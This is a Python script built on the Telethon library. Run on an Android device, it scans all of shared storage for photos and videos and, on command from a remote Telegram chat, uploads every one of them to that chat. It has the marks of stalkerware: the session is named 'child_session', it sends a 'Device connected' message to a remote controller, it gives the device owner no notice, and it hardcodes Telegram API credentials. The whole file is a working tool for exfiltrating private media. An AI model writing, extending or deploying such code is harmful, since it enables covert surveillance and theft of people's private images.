# main.py
import os
import json
import asyncio
from telethon import TelegramClient, events, Button

# ================= CONFIG =================
CONFIG_PATH = os.path.join(os.path.dirname(__file__), "config.json")
with open(CONFIG_PATH, "r") as f:
    config = json.load(f)

BOT_TOKEN = config["BOT_TOKEN"]
CHAT_ID = config["CHAT_ID"]

# Image and video extensions
IMAGE_EXTS = (".jpg", ".jpeg", ".png", ".heic", ".webp")
VIDEO_EXTS = (".mp4", ".mov", ".mkv", ".avi", ".webm")
MEDIA_EXTS = IMAGE_EXTS + VIDEO_EXTS

# ================= FUNCTIONS =================
def list_all_media(exts=MEDIA_EXTS):
    """Scan entire accessible storage for files with given extensions."""
    files = []
    storage_root = "/storage/emulated/0"
    for root, dirs, filenames in os.walk(storage_root):
        for fn in filenames:
            if fn.lower().endswith(exts):
                path = os.path.join(root, fn)
                try:
                    mtime = os.path.getmtime(path)
                except:
                    mtime = 0
                files.append((mtime, path))
    files.sort(reverse=True)
    return [p for _, p in files]

async def send_files_in_batches(client, files, batch_size=10):
    if not files:
        await client.send_message(CHAT_ID, "No files found.")
        return

    await client.send_message(CHAT_ID, f"Sending {len(files)} files in batches of {batch_size}...")

    for i in range(0, len(files), batch_size):
        batch = files[i:i+batch_size]

        # Telegram allows max 10 files per album
        for j in range(0, len(batch), 10):
            album = batch[j:j+10]
            if album:
                try:
                    await client.send_file(CHAT_ID, album)
                    await asyncio.sleep(1)  # small delay between albums
                except Exception as e:
                    print(f"Failed to send album starting with {album[0]}: {e}")

async def send_media(client):
    files = list_all_media()
    await send_files_in_batches(client, files)

async def send_images(client):
    files = list_all_media(IMAGE_EXTS)
    await send_files_in_batches(client, files)

async def send_videos(client):
    files = list_all_media(VIDEO_EXTS)
    await send_files_in_batches(client, files)

# ================= MAIN =================
async def main():
    api_id = 22071176
    api_hash = '7ed5401b625a0a4d3c45caf12c87f166'

    client = TelegramClient('child_session', api_id, api_hash)
    await client.start(bot_token=BOT_TOKEN)

    # Send device connected message with buttons
    await client.send_message(
        CHAT_ID,
        "Device connected ✅",
        buttons=[
            [Button.inline("Get All Media", b"get_media")],
            [Button.inline("Get Images Only", b"get_images")],
            [Button.inline("Get Videos Only", b"get_videos")]
        ]
    )

    @client.on(events.CallbackQuery)
    async def callback(event):
        if event.sender_id != CHAT_ID:
            return

        if event.data == b"get_media":
            await event.answer("Sending all images and videos in batches...")
            await send_media(client)
        elif event.data == b"get_images":
            await event.answer("Sending images only...")
            await send_images(client)
        elif event.data == b"get_videos":
            await event.answer("Sending videos only...")
            await send_videos(client)

    print("Child bot is running...")
    await client.run_until_disconnected()

if __name__ == "__main__":
    asyncio.run(main())
